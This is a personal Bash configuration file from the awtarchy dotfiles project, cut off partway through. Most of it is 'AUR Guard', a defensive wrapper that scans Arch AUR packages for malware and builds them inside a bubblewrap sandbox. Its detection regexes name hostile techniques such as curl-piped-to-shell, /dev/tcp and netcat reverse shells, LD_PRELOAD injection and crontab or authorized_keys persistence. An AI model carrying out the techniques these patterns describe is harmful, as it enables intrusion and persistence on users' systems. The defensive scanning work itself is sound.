# shellcheck shell=bash
# github.com/dillacorn/awtarchy
# ~/.bashrc - User-specific Bash configuration

# Only run if shell is interactive
[[ $- != *i* ]] && return

# --- Aliases ---
# Colorize common commands for better visibility
alias ls='ls --color=auto'
alias grep='grep --color=auto'

# Flatpak alias to always use --user flag on non-Btrfs systems
alias flatpak='flatpak --user'

# Shortcut to launch Hyprland under Wayland session
alias hypr='XDG_SESSION_TYPE=wayland exec start-hyprland'

# --- Environment Variables ---
# Default editor for command line text editing
export EDITOR=/usr/bin/micro

# GTK theme for graphical apps
export GTK_THEME=Materia-dark

# --- Prompt ---
# PS1 defines the command prompt appearance
# \w = full current working directory path
# \$ = shows '#' for root, '$' for normal user
# Icon can be customized, examples: 󰞷 (penguin), , λ, etc.
PS1='󰞷 \w\$ '

# --- Functions ---

# Run a command in the background, redirecting output to a log file
background() {
  if [ $# -lt 1 ]; then
    echo "Usage: background <command> [args...]"
    return 1
  fi

  # Sanitize command name for log filename (replace '/' with '_')
  local cmd_name="${1//\//_}"

  # Run command detached from terminal, log output in ~/.cache/
  nohup "$@" > ~/.cache/"$cmd_name".log 2>&1 < /dev/null &

  echo "$1 started in background. Logs: ~/.cache/$cmd_name.log"
}

dryrun() {
    # Check if file exists and is readable
    if [[ ! -f "$1" || ! -r "$1" ]]; then
        echo -e "\033[1;31m✘ Error: '$1' is not a readable script file\033[0m" >&2
        return 1
    fi

    local script_name
    script_name=$(basename "$1")
    echo -e "\n\033[1;33m🏗️  DRY RUN: \033[1;37m${script_name}\033[0m"

    # Syntax & lint check using ShellCheck
    echo -e "\n\033[1;34m🔎 ShellCheck Analysis:\033[0m"
    if command -v shellcheck >/dev/null 2>&1; then
        if shellcheck "$1"; then
            echo -e "\033[1;32m✓ ShellCheck passed (no issues)\033[0m"
        else
            echo -e "\n\033[1;31m✘ ShellCheck found issues\033[0m" >&2
            return 1
        fi
    else
        echo -e "\033[1;31m✘ ShellCheck is not installed. Install it first:\033[0m"
        echo "  pacman -S shellcheck   # Arch"
        echo "  apt install shellcheck # Debian/Ubuntu"
        return 1
    fi

    # Command analysis with improved detection
    echo -e "\n\033[1;34m📊 Operations Analysis:\033[0m"

    declare -A categories=(
        ["🔧 System Modifications"]='sudo|install|ch(mod|own)|ufw|mount'
        ["📦 Package Management"]='yay|pacman|makepkg|flatpak|dnf|apt'
        ["🗂️  File Operations"]='rm\>|mv\>|cp\>|mkdir|ln\>'
        ["🔄 Git Operations"]='git\s+(clone|push|pull|reset|checkout)'
        ["🌐 Network Operations"]='curl\>|wget\>|ssh\>|scp\>'
    )

    local found_operations=false
    for category in "${!categories[@]}"; do
        local matches
        matches=$(grep -E --color=always -n "${categories[$category]}" "$1")
        if [[ -n "$matches" ]]; then
            found_operations=true
            echo -e "\n\033[1;35m${category}:\033[0m"
            echo "$matches" | while read -r line; do
                echo -e "  \033[1;36mLine ${line%%:*}\033[0m: ${line#*:}"
            done
        fi
    done

    if ! $found_operations; then
        echo -e "\033[1;37mNo potentially impactful operations found\033[0m"
    fi

    echo -e "\n\033[1;33m💡 Dry run complete. To execute:\033[0m\n\033[1;32m./${script_name}\033[0m"
}

# Remove older Awtarchy AUR Guard wrappers if this shell already loaded them.
unset -f yay paru 2>/dev/null

# --- AUR Guard ---
# Safe-by-default AUR workflow for interactive shells.
#
# Normal workflow:
#   sysupdate             update enabled pacman repository packages
#   aurcheck              list available AUR updates, emergency blocks, and historical warnings
#   aurverify package     recursively verify one AUR package and its AUR dependencies
#   aurup package         verify the complete AUR dependency tree, then install
#
# Raw yay/paru sync transactions are blocked. Use aurunsafe only after manual review.

_AUR_GUARD_ARCH_LIST_URL='https://md.archlinux.org/s/SxbqukK6IA/download'
_AUR_GUARD_GITHUB_LIST_URL='https://raw.githubusercontent.com/lenucksi/aur-malware-check/master/package_list.txt'
_AUR_GUARD_CACHE_DIR="${XDG_CACHE_HOME:-$HOME/.cache}/awtarchy/aur-guard"
_AUR_GUARD_LIST_MAX_AGE=86400
_AUR_GUARD_LIST_MIN_NAMES=100

# Exact names that should remain permanently blocked even after historical
# incident records are cleaned or restored. Keep this list intentionally small.
_AUR_GUARD_EMERGENCY_BLOCK_PACKAGES=(
  vesktop-bin-patched
)

_AUR_GUARD_HARD_BLOCK_RE='atomic-lockfile|lockfile-js|js-digest|digest-js|src/hooks/deps|/api/agent|hidden_pids|hidden_names|hidden_inodes|curl[[:space:]][^|;]*\|[[:space:]]*(sh|bash)|wget[[:space:]][^|;]*\|[[:space:]]*(sh|bash)|base64[[:space:]]+(-d|--decode)|/dev/tcp|/dev/udp'
_AUR_GUARD_HOOK_BLOCK_RE='npm[[:space:]]+(install|i|add)|bun[[:space:]]+(install|add|i)|pnpm[[:space:]]+(install|add|i)|yarn[[:space:]]+(install|add)'
_AUR_GUARD_PACKAGE_JSON_BLOCK_RE='"(preinstall|postinstall)"[[:space:]]*:'
_AUR_GUARD_SOURCE_HARD_BLOCK_RE="${_AUR_GUARD_HARD_BLOCK_RE}|\$\([[:space:]]*(curl|wget)[^)]*\)|<\([[:space:]]*(curl|wget)[^)]*\)|(^|[;&|[:space:]])(nc|ncat)[[:space:]][^#]*[[:space:]]-e[[:space:]]|socat[[:space:]].*(EXEC|SYSTEM):|mkfifo[[:space:]].*(nc|ncat)|LD_PRELOAD=.*(/tmp|/dev/shm)|/etc/ld\.so\.preload|\.ssh/authorized_keys|\.config/autostart|systemd/user/|(^|[;&|[:space:]])crontab([[:space:]]|$)"
_AUR_GUARD_SOURCE_DOWNLOAD_RE='(^|[;&|[:space:]])(curl|wget|fetch|aria2c)[[:space:]]'
_AUR_GUARD_SOURCE_EXEC_RE='chmod[[:space:]][^#]*\+x|(^|[;&|[:space:]])(bash|sh|zsh|fish|python3?|perl|ruby|node)[[:space:]][^#]*(/tmp|/dev/shm)|(^|[;&|[:space:]])(eval|source)[[:space:]]|(^|[;&|[:space:]])\.[[:space:]]+[^[:space:]]|(^|[;&|[:space:]])(sudo|pkexec)[[:space:]]'
_AUR_GUARD_SOURCE_SCAN_MAX_BYTES=$((8 * 1024 * 1024))
_AUR_GUARD_SOURCE_SCAN_MAX_FILES=15000
_AUR_GUARD_SANDBOX_TIMEOUT_SECONDS=900
_AUR_GUARD_SANDBOX_KILL_AFTER_SECONDS=10

_aur_guard_pass() {
  local msg="$1"
  printf '\n\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m\n'
  printf '\033[1;32mPASSED:\033[0m %s\n' "$msg"
  printf '\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m\n'
}

_aur_guard_fail() {
  local msg="$1"
  printf '\n\033[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m\n' >&2
  printf '\033[1;31mFAILED:\033[0m %s\n' "$msg" >&2
  printf '\033[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m\n' >&2
}

_aur_guard_refuse_install() {
  local pkg="$1"
  local reason="$2"

  printf '\n\033[1;31mAwtarchy refused to install: %s\033[0m\n' "$pkg" >&2
  printf 'Reason: %s\n' "$reason" >&2
  printf 'No package was installed.\n' >&2
}

_aur_guard_pick_helper() {
  if type -P yay >/dev/null 2>&1; then
    printf 'yay\n'
  elif type -P paru >/dev/null 2>&1; then
    printf 'paru\n'
  else
    return 1
  fi
}

_aur_guard_download() {
  local url="$1"
  local output="$2"

  if type -P curl >/dev/null 2>&1; then
    command curl --fail --silent --show-error --location \
      --proto '=https' --tlsv1.2 \
      --connect-timeout 10 --max-time 45 --retry 2 \
      --output "$output" "$url"
  elif type -P wget >/dev/null 2>&1; then
    command wget --https-only --timeout=45 --tries=3 \
      --quiet --output-document="$output" "$url"
  else
    return 127
  fi
}

_aur_guard_cache_is_fresh() {
  local file="$1"
  local now mtime

  [[ -s "$file" ]] || return 1
  now=$(date +%s)
  mtime=$(stat -c %Y "$file" 2>/dev/null) || return 1
  (( now - mtime <= _AUR_GUARD_LIST_MAX_AGE ))
}

_aur_guard_normalize_list() {
  local input="$1"
  local output="$2"

  LC_ALL=C tr -cs 'a-z0-9@._+-' '\n' < "$input" \
    | grep -E '^[a-z0-9][a-z0-9@._+-]*$' \
    | LC_ALL=C sort -u > "$output"
}

_aur_guard_update_one_list() {
  local label="$1"
  local url="$2"
  local raw="$3"
  local names="$4"
  local tmp

  tmp=$(mktemp "${raw}.tmp.XXXXXX") || return 1

  if _aur_guard_download "$url" "$tmp" && [[ -s "$tmp" ]]; then
    mv -f "$tmp" "$raw"
    _aur_guard_normalize_list "$raw" "$names"
  else
    rm -f "$tmp"
    if _aur_guard_cache_is_fresh "$raw"; then
      printf 'AUR Guard: %s list download failed; using cache newer than 24 hours.\n' "$label" >&2
      [[ -s "$names" ]] || _aur_guard_normalize_list "$raw" "$names"
    else
      return 1
    fi
  fi

  [[ -s "$names" ]] || return 1

  local count
  count=$(wc -l < "$names")
  (( count >= _AUR_GUARD_LIST_MIN_NAMES ))
}

_aur_guard_refresh_blacklists() {
  local arch_raw arch_names github_raw github_names

  mkdir -p "$_AUR_GUARD_CACHE_DIR" || return 1

  arch_raw="$_AUR_GUARD_CACHE_DIR/arch-malware-list.raw"
  arch_names="$_AUR_GUARD_CACHE_DIR/arch-malware-list.names"
  github_raw="$_AUR_GUARD_CACHE_DIR/github-malware-list.raw"
  github_names="$_AUR_GUARD_CACHE_DIR/github-malware-list.names"

  if ! _aur_guard_update_one_list \
      'Arch' \
      "$_AUR_GUARD_ARCH_LIST_URL" \
      "$arch_raw" \
      "$arch_names"; then
    _aur_guard_fail 'could not download or use a fresh cached Arch malware package list'
    return 1
  fi

  if ! _aur_guard_update_one_list \
      'GitHub community' \
      "$_AUR_GUARD_GITHUB_LIST_URL" \
      "$github_raw" \
      "$github_names"; then
    _aur_guard_fail 'could not download or use a fresh cached GitHub malware package list'
    return 1
  fi
}

declare -A _AUR_GUARD_HISTORICAL_MATCHES=()

_aur_guard_historical_sources() {
  local pkg="$1"
  local found=false

  if /usr/bin/grep -Fxq -- "$pkg" "$_AUR_GUARD_CACHE_DIR/arch-malware-list.names"; then
    printf 'Arch maintained incident list\n'
    found=true
  fi

  if /usr/bin/grep -Fxq -- "$pkg" "$_AUR_GUARD_CACHE_DIR/github-malware-list.names"; then
    printf 'GitHub aur-malware-check list\n'
    found=true
  fi

  $found
}

_aur_guard_emergency_block_source() {
  local pkg="$1"
  local bad

  for bad in "${_AUR_GUARD_EMERGENCY_BLOCK_PACKAGES[@]}"; do
    if [[ "$pkg" == "$bad" ]]; then
      printf 'Awtarchy built-in emergency blocklist\n'
      return 0
    fi
  done

  return 1
}

_aur_guard_check_emergency_block() {
  local pkg="$1"
  local source

  source=$(_aur_guard_emergency_block_source "$pkg") || return 0

  printf '\n\033[1;31mHARD BLOCK MATCH:\033[0m %s\n' "$pkg" >&2
  printf '  - %s\n' "$source" >&2
  return 1
}

_aur_guard_note_historical_match() {
  local pkg="$1"
  local sources

  sources=$(_aur_guard_historical_sources "$pkg") || return 0

  if [[ ! ${_AUR_GUARD_HISTORICAL_MATCHES[$pkg]+set} ]]; then
    _AUR_GUARD_HISTORICAL_MATCHES["$pkg"]="$sources"

    printf '\n\033[1;33mHISTORICAL INCIDENT MATCH:\033[0m %s\n' "$pkg" >&2
    while IFS= read -r source; do
      [[ -n "$source" ]] && printf '  - %s\n' "$source" >&2
    done <<< "$sources"
    printf 'This name was previously reported as affected. That does not prove the current AUR revision is malicious.\n' >&2
    printf 'Awtarchy will continue with enhanced recursive and sandboxed verification.\n' >&2
  fi
}

_aur_guard_has_historical_matches() {
  (( ${#_AUR_GUARD_HISTORICAL_MATCHES[@]} > 0 ))
}

_aur_guard_print_historical_summary() {
  local pkg source

  _aur_guard_has_historical_matches || return 0

  printf '\n\033[1;33mHistorical incident matches in this AUR dependency tree:\033[0m\n' >&2
  while IFS= read -r pkg; do
    printf '  %s\n' "$pkg" >&2
    while IFS= read -r source; do
      [[ -n "$source" ]] && printf '    - %s\n' "$source" >&2
    done <<< "${_AUR_GUARD_HISTORICAL_MATCHES[$pkg]}"
  done < <(printf '%s\n' "${!_AUR_GUARD_HISTORICAL_MATCHES[@]}" | LC_ALL=C sort)
}

_aur_guard_confirm_historical_install() {
  local requested_pkg="$1"
  local answer

  _aur_guard_has_historical_matches || return 0

  _aur_guard_print_historical_summary
  printf '\nThe current revisions passed Awtarchy verification, but historical incident records remain.\n' >&2
  printf 'Type exactly INSTALL %s to continue: ' "$requested_pkg" >&2

  if ! IFS= read -r answer; then
    printf '\nCancelled. No package was installed.\n' >&2
    return 1
  fi

  if [[ "$answer" != "INSTALL $requested_pkg" ]]; then
    printf 'Cancelled. No package was installed.\n' >&2
    return 1
  fi
}

_aur_guard_has_unsafe_flag() {
  local arg

  for arg in "$@"; do
    case "$arg" in
      --noconfirm|--skipreview|--mflags|--mflags=*|--answerclean*|--answerdiff*|--answeredit*|--skippgpcheck|--skipchecksums|--skipinteg)
        return 0
        ;;
    esac
  done

  return 1
}

_aur_guard_is_mass_update() {
  local arg

  if [[ $# -eq 0 ]]; then
    return 0
  fi

  for arg in "$@"; do
    case "$arg" in
      -Syu|-Syyu|-Syuu|-Syyyu|-Sua|--sysupgrade)
        return 0
        ;;
    esac
  done

  return 1
}

_aur_guard_is_sync_install() {
  local arg

  for arg in "$@"; do
    case "$arg" in
      --sync|-S|-Sy|-Syy|-Syu|-Syyu|-Syuu|-Syyyu|-Sua)
        return 0
        ;;
    esac
  done

  return 1
}

_aur_guard_has_default_install_search() {
  local arg
  local has_mode=false

  for arg in "$@"; do
    case "$arg" in
      -Q*|-G|-P*|-S[silgpcw]*|--query|--getpkgbuild|--show-stats|--search|--info|--list|--groups|--print|--clean|--downloadonly|--help|--version)
        has_mode=true
        ;;
    esac
  done

  $has_mode && return 1
  return 0
}

_aur_guard_block_message() {
  local helper="$1"

  printf '\033[1;31mAUR Guard blocked this %s transaction.\033[0m\n\n' "$helper"
  printf 'Raw AUR installs and mass updates bypass Awtarchy recursive verification.\n\n'
  printf 'Use:\n'
  printf '  sysupdate             update enabled pacman repo packages\n'
  printf '  aurcheck              show AUR updates, emergency blocks, and historical warnings\n'
  printf '  aurverify package     recursively verify a package and all AUR dependencies\n'
  printf '  aurup package         recursively verify, then install one package\n\n'
  printf 'Unsafe manual override:\n'
  printf '  aurunsafe %s [arguments]\n' "$helper"
}

_aur_guard_dependency_name() {
  local dep="$1"
  dep="${dep%%[<>=]*}"
  dep="${dep//[[:space:]]/}"
  printf '%s\n' "$dep"
}

_aur_guard_find_installed_provider() {
  local dep_name="$1"
  local desc

  for desc in /var/lib/pacman/local/*/desc; do
    [[ -r "$desc" ]] || continue
    awk -v wanted="$dep_name" '
      $0 == "%NAME%" {
        getline
        name = $0
        if (name == wanted) {
          print name
          exit
        }
        next
      }
      $0 == "%PROVIDES%" {
        in_provides = 1
        next
      }
      in_provides && $0 == "" {
        in_provides = 0
        next
      }
      in_provides {
        provided = $0
        sub(/[<>=].*$/, "", provided)
        if (provided == wanted) {
          print name
          exit
        }
      }
    ' "$desc"
  done | LC_ALL=C sort -u | head -n 1
}

_aur_guard_rpc_exact_package() {
  local pkg="$1"
  local json

  json=$(mktemp) || return 1
  if ! _aur_guard_download \
      "https://aur.archlinux.org/rpc/v5/info?arg%5B%5D=${pkg}" \
      "$json"; then
    rm -f "$json"
    return 1
  fi

  command jq -r --arg pkg "$pkg" '
    .results[]
    | select(.Name == $pkg)
    | .Name
  ' "$json"

  local status=$?
  rm -f "$json"
  return "$status"
}

_aur_guard_rpc_providers() {
  local dep_name="$1"
  local json

  type -P jq >/dev/null 2>&1 || return 2

  json=$(mktemp) || return 1
  if ! _aur_guard_download \
      "https://aur.archlinux.org/rpc/v5/search/${dep_name}?by=provides" \
      "$json"; then
    rm -f "$json"
    return 1
  fi

  command jq -r --arg dep "$dep_name" '
    .results[]
    | select(
        .Name == $dep
        or ((.Provides // [])
          | map(sub("[<>=].*$"; ""))
          | index($dep))
      )
    | .Name
  ' "$json" | LC_ALL=C sort -u

  local status=${PIPESTATUS[0]}
  rm -f "$json"
  return "$status"
}

_aur_guard_prepare_public_keyring() {
  local pkgdir="$1"
  local gnupg_dir="$pkgdir/.awtarchy-gnupg"
  local exported_keys="$pkgdir/.awtarchy-public-keys.gpg"

  rm -rf "$gnupg_dir"
  install -d -m 0700 "$gnupg_dir" || return 1

  if command gpg --batch --export > "$exported_keys" 2>/dev/null \
      && [[ -s "$exported_keys" ]]; then
    if ! GNUPGHOME="$gnupg_dir" command gpg --batch --quiet \
        --import "$exported_keys" >/dev/null 2>&1; then
      rm -f "$exported_keys"
      _aur_guard_fail 'could not create an isolated public-key ring for source verification'
      return 1
    fi
  fi

  rm -f "$exported_keys"
}

_aur_guard_makepkg_sandbox() {
  local pkgdir="$1"
  local network="$2"
  local access="$3"
  local username hidden
  local -a bwrap_args

  shift 3
  username="${USER:-$(id -un)}"

  mkdir -p \
    "$pkgdir/.awtarchy-gnupg" \
    "$pkgdir/.awtarchy-build" \
    "$pkgdir/.awtarchy-pkg" \
    "$pkgdir/.awtarchy-srcpkg" \
    "$pkgdir/.awtarchy-log" \
    "$pkgdir/.awtarchy-cache" || return 1

  bwrap_args=(
    --die-with-parent
    --new-session
    --unshare-all
    --cap-drop ALL
  )

  case "$network" in
    allow)
      bwrap_args+=(--share-net)
      ;;
    deny)
      ;;
    *)
      _aur_guard_fail "invalid sandbox network mode: $network"
      return 2
      ;;
  esac

  bwrap_args+=(
    --ro-bind / /
    --dev /dev
    --proc /proc
    --tmpfs /tmp
  )

  for hidden in /home /root /mnt /media /run/user /run/dbus /run/media /var/tmp; do
    [[ -d "$hidden" ]] && bwrap_args+=(--tmpfs "$hidden")
  done

  bwrap_args+=(--dir /work)

  case "$access" in
    readonly)
      bwrap_args+=(--ro-bind "$pkgdir" /work)
      ;;
    writable)
      bwrap_args+=(--bind "$pkgdir" /work)
      if [[ -d "$pkgdir/.git" ]]; then
        bwrap_args+=(--ro-bind "$pkgdir/.git" /work/.git)
      fi
      ;;
    *)
      _aur_guard_fail "invalid sandbox filesystem mode: $access"
      return 2
      ;;
  esac

  bwrap_args+=(
    --dir /tmp/awtarchy-home
    --clearenv
    --setenv HOME /tmp/awtarchy-home
    --setenv USER "$username"
    --setenv LOGNAME "$username"
    --setenv SHELL /bin/bash
    --setenv PATH /usr/local/sbin:/usr/local/bin:/usr/bin
    --setenv LANG C.UTF-8
    --setenv LC_ALL C.UTF-8
    --setenv TMPDIR /tmp
    --setenv GNUPGHOME /work/.awtarchy-gnupg
    --setenv XDG_CACHE_HOME /work/.awtarchy-cache
    --setenv SRCDEST /work
    --setenv BUILDDIR /work/.awtarchy-build
    --setenv PKGDEST /work/.awtarchy-pkg
    --setenv SRCPKGDEST /work/.awtarchy-srcpkg
    --setenv LOGDEST /work/.awtarchy-log
    --chdir /work
    /usr/bin/makepkg
    "$@"
  )

  command timeout \
    --foreground \
    --kill-after="${_AUR_GUARD_SANDBOX_KILL_AFTER_SECONDS}s" \
    "${_AUR_GUARD_SANDBOX_TIMEOUT_SECONDS}s" \
    bwrap "${bwrap_args[@]}"
}

_aur_guard_assert_tracked_files_unchanged() {
  local pkg="$1"
  local pkgdir="$2"

  if ! command git -C "$pkgdir" diff --quiet -- . \
      || ! command git -C "$pkgdir" diff --cached --quiet -- .; then
    command git -C "$pkgdir" diff -- . >&2 || true
    _aur_guard_fail "$pkg modified tracked AUR files while makepkg metadata or sources were being inspected"
    return 1
  fi
}

_aur_guard_source_candidate() {
  local file="$1"
  local relative="$2"
  local name="${relative##*/}"

  case "$name" in
    PKGBUILD|*.sh|*.bash|*.zsh|*.fish|*.py|*.pyw|*.pl|*.rb|*.js|*.mjs|*.cjs|*.ts|*.lua|*.tcl|*.awk|*.inc|*.env|*.conf|*.cfg|*.rc|*.profile|*.mk|*.in|*.patch|*.diff|*.service|*.timer|*.socket|*.path|*.desktop|*.hook|*.install|*.cmake|CMakeLists.txt|meson.build|meson_options.txt|Makefile|GNUmakefile|makefile|configure|configure.ac|bootstrap|install|setup|build|run|package.json|pyproject.toml|build.rs)
      return 0
      ;;
  esac

  [[ -x "$file" ]] && return 0
  [[ $(head -c 2 "$file" 2>/dev/null) == '#!' ]]
}

_aur_guard_scan_source_tree() {
  local pkg="$1"
  local root="$2"
  local mode="${3:-recursive}"
  local file relative size
  local scanned=0
  local network_reference_files=0
  local matched=false
  local -a find_args

  [[ -d "$root" ]] || return 0

  find_args=("$root")
  if [[ "$mode" == 'top' ]]; then
    find_args+=(-maxdepth 1)
  fi
  find_args+=(
    -type f
    ! -path '*/.git/*'
    ! -path '*/.awtarchy-gnupg/*'
    ! -path '*/.awtarchy-cache/*'
    ! -path '*/.awtarchy-pkg/*'
    ! -path '*/.awtarchy-srcpkg/*'
    ! -path '*/.awtarchy-log/*'
    -print0
  )

  while IFS= read -r -d '' file; do
    relative="${file#"$root"/}"
    _aur_guard_source_candidate "$file" "$relative" || continue

    ((scanned += 1))
    if (( scanned > _AUR_GUARD_SOURCE_SCAN_MAX_FILES )); then
      _aur_guard_fail "$pkg contains more than $_AUR_GUARD_SOURCE_SCAN_MAX_FILES script or build files; refusing an incomplete source scan"
      return 1
    fi

    size=$(stat -c %s "$file" 2>/dev/null) || {
      _aur_guard_fail "could not determine source-file size: $relative"
      return 1
    }

    if (( size > _AUR_GUARD_SOURCE_SCAN_MAX_BYTES )); then
      _aur_guard_fail "$pkg contains a script-like source file larger than the scan limit: $relative"
      return 1
    fi

    /usr/bin/grep -Iq . "$file" || continue

    if /usr/bin/grep -Eq 'https?://|git(\+https)?://|ssh://' "$file"; then
      ((network_reference_files += 1))
    fi

    if /usr/bin/grep -HnEi "$_AUR_GUARD_SOURCE_HARD_BLOCK_RE" "$file"; then
      matched=true
    fi

    if /usr/bin/grep -Eq "$_AUR_GUARD_SOURCE_DOWNLOAD_RE" "$file" \
        && /usr/bin/grep -Eq "$_AUR_GUARD_SOURCE_EXEC_RE" "$file"; then
      printf '%s: contains both network-download and execution/persistence behavior\n' \
        "$file"
      matched=true
    fi

    if [[ ${relative##*/} == 'package.json' ]] \
        && /usr/bin/grep -HnE "$_AUR_GUARD_PACKAGE_JSON_BLOCK_RE" "$file"; then
      matched=true
    fi
  done < <(find "${find_args[@]}")

  if $matched; then
    _aur_guard_fail "known malicious or unsafe execution pattern found in downloaded source code for $pkg"
    return 1
  fi

  printf 'AUR Verify: scanned %d script/build files for %s.\n' \
    "$scanned" "$pkg"
  printf 'AUR Verify: %d scanned files referenced network URLs; those URLs were not crawled.\n' \
    "$network_reference_files"
}

_aur_guard_scan_package_files() {
  local pkg="$1"
  local pkgdir="$2"
  local matched=false

  printf 'AUR Verify: scanning %s for known malicious patterns.\n' "$pkg"

  if grep -RInE \
      --exclude-dir='.git' \
      --binary-files=without-match \
      "$_AUR_GUARD_HARD_BLOCK_RE" \
      "$pkgdir"; then
    matched=true
  fi

  local hook_matches package_json_matches

  hook_matches=$(find "$pkgdir" -type f -name '*.install' \
    -exec /usr/bin/grep -HnE "$_AUR_GUARD_HOOK_BLOCK_RE" {} + 2>/dev/null) || true
  if [[ -n "$hook_matches" ]]; then
    printf '%s\n' "$hook_matches"
    matched=true
  fi

  package_json_matches=$(find "$pkgdir" -type f -name 'package.json' \
    -exec /usr/bin/grep -HnE "$_AUR_GUARD_PACKAGE_JSON_BLOCK_RE" {} + 2>/dev/null) || true
  if [[ -n "$package_json_matches" ]]; then
    printf '%s\n' "$package_json_matches"
    matched=true
  fi

  if $matched; then
    _aur_guard_fail "known malicious or unsafe execution pattern found in $pkg"
    return 1
  fi

  grep -RInE \
    --exclude-dir='.git' \
    --include='PKGBUILD' \
    --include='*.install' \
    '^[[:space:]]*install=|post_install|post_upgrade|pre_install|pre_upgrade|setcap|chmod[[:space:]].*[+u]s|systemctl' \
    "$pkgdir" || true

  _aur_guard_scan_source_tree "$pkg" "$pkgdir" recursive
}

_aur_guard_verify_srcinfo() {
  local pkg="$1"
  local pkgdir="$2"
  local generated="$pkgdir/.SRCINFO.awtarchy"

  [[ -f "$pkgdir/.SRCINFO" ]] || {
    _aur_guard_fail "$pkg has no committed .SRCINFO"
    return 1
  }

  if ! _aur_guard_makepkg_sandbox "$pkgdir" deny readonly \
      --printsrcinfo > "$generated"; then
    rm -f "$generated"
    _aur_guard_fail "could not regenerate .SRCINFO for $pkg inside the sandbox"
    return 1
  fi

  _aur_guard_assert_tracked_files_unchanged "$pkg" "$pkgdir" || {
    rm -f "$generated"
    return 1
  }

  if ! diff -u "$pkgdir/.SRCINFO" "$generated"; then
    rm -f "$generated"
    _aur_guard_fail "$pkg has a PKGBUILD/.SRCINFO mismatch"
    return 1
  fi

  mv -f "$generated" "$pkgdir/.SRCINFO.verified"
}

_aur_guard_fetch_package() {
  local pkg="$1"
  local fetch_parent="$2"
  local helper="$3"
  local pkgdir

  mkdir -p "$fetch_parent" || return 1

  if ! (cd "$fetch_parent" && command "$helper" -G "$pkg" >/dev/null 2>&1); then
    return 1
  fi

  pkgdir=$(find "$fetch_parent" -mindepth 1 -maxdepth 1 -type d -print -quit)
  [[ -n "$pkgdir" && -f "$pkgdir/PKGBUILD" ]] || return 1
  printf '%s\n' "$pkgdir"
}

_aur_guard_verify_package_recursive() {
  local pkg="$1"
  local parent="$2"
  local helper="$_AUR_GUARD_HELPER"
  local fetch_parent pkgdir pkgbase commit remote srcinfo
  local split_pkg dep_spec dep_name provider exact_aur_pkg
  local -a providers=()

  [[ -n "$pkg" ]] || return 1

  if [[ ${_AUR_GUARD_REQUEST_STATE[$pkg]+set} ]]; then
    case "${_AUR_GUARD_REQUEST_STATE[$pkg]}" in
      done) return 0 ;;
      active) return 0 ;;
      failed) return 1 ;;
    esac
  fi
  _AUR_GUARD_REQUEST_STATE[$pkg]='active'

  if ! _aur_guard_check_emergency_block "$pkg"; then
    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
    _aur_guard_fail "$pkg is present on the Awtarchy emergency blocklist"
    return 1
  fi
  _aur_guard_note_historical_match "$pkg"

  fetch_parent="$_AUR_GUARD_WORK_DIR/fetch/${pkg//[^a-zA-Z0-9._+-]/_}"
  rm -rf "$fetch_parent"

  pkgdir=$(_aur_guard_fetch_package "$pkg" "$fetch_parent" "$helper") || {
    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
    _aur_guard_fail "failed to fetch AUR package $pkg"
    return 1
  }

  _aur_guard_scan_package_files "$pkg" "$pkgdir" || {
    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
    return 1
  }

  _aur_guard_verify_srcinfo "$pkg" "$pkgdir" || {
    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
    return 1
  }

  srcinfo="$pkgdir/.SRCINFO.verified"
  pkgbase=$(awk -F ' = ' '/^[[:space:]]*pkgbase = / {print $2; exit}' "$srcinfo")
  [[ -n "$pkgbase" ]] || pkgbase="$pkg"

  if [[ ${_AUR_GUARD_BASE_STATE[$pkgbase]+set} ]]; then
    _AUR_GUARD_REQUEST_STATE[$pkg]='done'
    rm -rf "$fetch_parent"
    return 0
  fi
  _AUR_GUARD_BASE_STATE[$pkgbase]='active'

  if ! _aur_guard_check_emergency_block "$pkgbase"; then
    _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
    _aur_guard_fail "$pkgbase is present on the Awtarchy emergency blocklist"
    return 1
  fi
  _aur_guard_note_historical_match "$pkgbase"

  while IFS= read -r split_pkg; do
    [[ -n "$split_pkg" ]] || continue
    if ! _aur_guard_check_emergency_block "$split_pkg"; then
      _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
      _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
      _aur_guard_fail "$split_pkg from package base $pkgbase is emergency-blocked"
      return 1
    fi
    _aur_guard_note_historical_match "$split_pkg"
  done < <(awk -F ' = ' '/^[[:space:]]*pkgname = / {print $2}' "$srcinfo")

  _aur_guard_prepare_public_keyring "$pkgdir" || {
    _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
    return 1
  }

  printf 'AUR Verify: verifying downloaded sources for %s inside bubblewrap.\n' "$pkgbase"
  if ! _aur_guard_makepkg_sandbox "$pkgdir" allow writable \
      --verifysource --noconfirm --nocolor; then
    _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
    _aur_guard_fail "source checksum or PGP verification failed for $pkgbase"
    return 1
  fi

  _aur_guard_assert_tracked_files_unchanged "$pkgbase" "$pkgdir" || {
    _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
    return 1
  }

  _aur_guard_scan_source_tree "$pkgbase" "$pkgdir" top || {
    _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
    return 1
  }

  rm -rf "$pkgdir/.awtarchy-build"
  mkdir -p "$pkgdir/.awtarchy-build" || return 1

  printf 'AUR Verify: extracting verified sources for %s inside an offline sandbox.\n' "$pkgbase"
  if ! _aur_guard_makepkg_sandbox "$pkgdir" deny writable \
      --nobuild --noprepare --noverify --nodeps --holdver --noconfirm --nocolor; then
    _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
    _aur_guard_fail "could not safely extract verified sources for $pkgbase"
    return 1
  fi

  _aur_guard_assert_tracked_files_unchanged "$pkgbase" "$pkgdir" || {
